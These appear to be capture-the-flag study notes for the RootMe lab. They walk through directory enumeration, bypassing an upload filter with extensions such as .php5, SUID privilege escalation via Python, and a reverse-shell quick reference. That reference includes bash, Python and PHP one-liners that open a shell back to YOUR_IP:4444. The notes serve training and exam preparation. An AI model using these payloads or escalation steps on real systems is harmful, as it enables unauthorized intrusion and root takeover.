# RootMe — CTF Notes

---

## 1. Core Concept

RootMe is a beginner web exploitation challenge combining directory enumeration, file upload bypass, reverse shell execution, and Linux privilege escalation. It teaches the full attack chain from initial foothold to root access.

| Phase | Technique | Goal |
|---|---|---|
| Reconnaissance | Directory enumeration | Find hidden upload panel |
| Exploitation | File upload bypass | Upload PHP reverse shell |
| Post-exploitation | SUID abuse | Escalate to root |

**Rule:** Every CTF follows the same chain — recon → foothold → escalation. Never skip recon.

---

## 2. Method 1 — Reconnaissance

Always start here. Map everything before touching anything.

**When to use:** First thing on any web challenge or real engagement

### Step 1 — Check the website
```
Open http://targetIP in browser
Read every word on the page
View page source: Ctrl+U
Look for: comments, usernames, hints, hidden links
```

### Step 2 — Check robots.txt
```
http://targetIP/robots.txt
Lists directories the owner wants hidden from search engines
```

### Step 3 — Directory enumeration with Gobuster
```bash
gobuster dir -u http://targetIP -w /usr/share/wordlists/dirb/common.txt
```

### What Gobuster output means

| Status Code | Meaning |
|---|---|
| 200 | Page exists and accessible |
| 301 | Redirect — follow it |
| 403 | Exists but forbidden |
| 404 | Does not exist |

### Common directories to always check manually
```
/admin
/login
/panel
/upload
/backup
/images
/files
/css
/js
```

> **Rule:** Run Gobuster on every web challenge. Hidden directories always exist.

---

## 3. Method 2 — File Upload Bypass

Upload a malicious file to a server that restricts file types.

**When to use:** Any file upload form that blocks PHP or executable files

### Step 1 — Try uploading PHP file directly
```
Upload shell.php
If blocked = server is filtering by extension
```

### Step 2 — Bypass extension filter
```
Rename file to bypass blacklist:
shell.php5
shell.php3
shell.phtml
shell.pHp
shell.PHP
```

### Step 3 — PHP reverse shell content
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>
```

### Step 4 — Set up listener before triggering shell
```bash
nc -lvnp 4444
```

### Step 5 — Trigger the shell
```
Navigate to the uploaded file in browser
http://targetIP/uploads/shell.php5
```

> **Rule:** If .php is blocked always try .php5 or .phtml first. These are often forgotten in blacklists.

---

## 4. Method 3 — Finding Flags

After getting shell access, search for flag files.

**When to use:** After establishing shell access on target machine

### Common flag locations
```bash
ls /
ls /var/www/
ls /home/
ls /root/
find / -name "*.txt" 2>/dev/null
find / -name "flag*" 2>/dev/null
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

### Read flag content
```bash
cat /var/www/user.txt
cat /root/root.txt
```

> **Rule:** Flags are usually named user.txt and root.txt. Always check /var/www/ and /root/.

---

## 5. Method 4 — Privilege Escalation via SUID

Escalate from normal user to root using files with SUID bit set.

**When to use:** After getting initial shell — need to become root

### What is SUID?
SUID (Set User ID) files run with the permissions of the file owner, not the person running them. If root owns an SUID file, anyone who runs it gets root permissions temporarily.

### Step 1 — Find SUID binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Step 2 — Identify exploitable binaries
Common SUID binaries that can be abused:
```
/usr/bin/python
/usr/bin/python3
/usr/bin/find
/usr/bin/vim
/usr/bin/nmap
/bin/bash
```

### Step 3 — Exploit using GTFOBins
```
Go to gtfobins.github.io
Search for the binary you found
Click SUID section
Copy and run the command shown
```

### Python SUID exploit example
```bash
# If /usr/bin/python has SUID:
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If /usr/bin/python3 has SUID:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Verify you are root
```bash
whoami
# Should output: root
id
# Should show uid=0(root)
```

> **Rule:** Always check gtfobins.github.io for any SUID binary you find. It lists exploits for every common binary.

---

## 6. Reverse Shell Quick Reference

```bash
# Set up listener (your machine):
nc -lvnp 4444

# Bash reverse shell:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP reverse shell one-liner:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>
```

---

## 7. Complete RootMe Attack Chain

```
START
  ↓
Reconnaissance — check website, robots.txt, run Gobuster
  ↓
Find /panel/ upload directory
  ↓
Try uploading shell.php → blocked
  ↓
Rename to shell.php5 → upload succeeds
  ↓
Start netcat listener: nc -lvnp 4444
  ↓
Navigate to uploaded file in browser
  ↓
Reverse shell connects back to listener
  ↓
Search for user flag: find /var/www/ -name "*.txt"
  ↓
Find SUID binaries: find / -perm -u=s -type f 2>/dev/null
  ↓
Find python with SUID
  ↓
Run GTFOBins exploit → get root shell
  ↓
Read root flag: cat /root/root.txt
  ↓
ROOTED
```

> **Rule:** Recon → Foothold → Escalation. This chain applies to every machine you will ever hack.

---

## 8. Key Takeaways

- Always run Gobuster — hidden directories always exist
- File upload filters are almost always bypassable with alternative extensions
- SUID binaries are one of the most common privilege escalation vectors
- GTFOBins is your bible for privilege escalation — bookmark it
- Netcat is the simplest way to catch reverse shells
- The attack chain recon → foothold → escalation applies to every machine
- RootMe techniques are directly tested in eJPT and OSCP exams

---
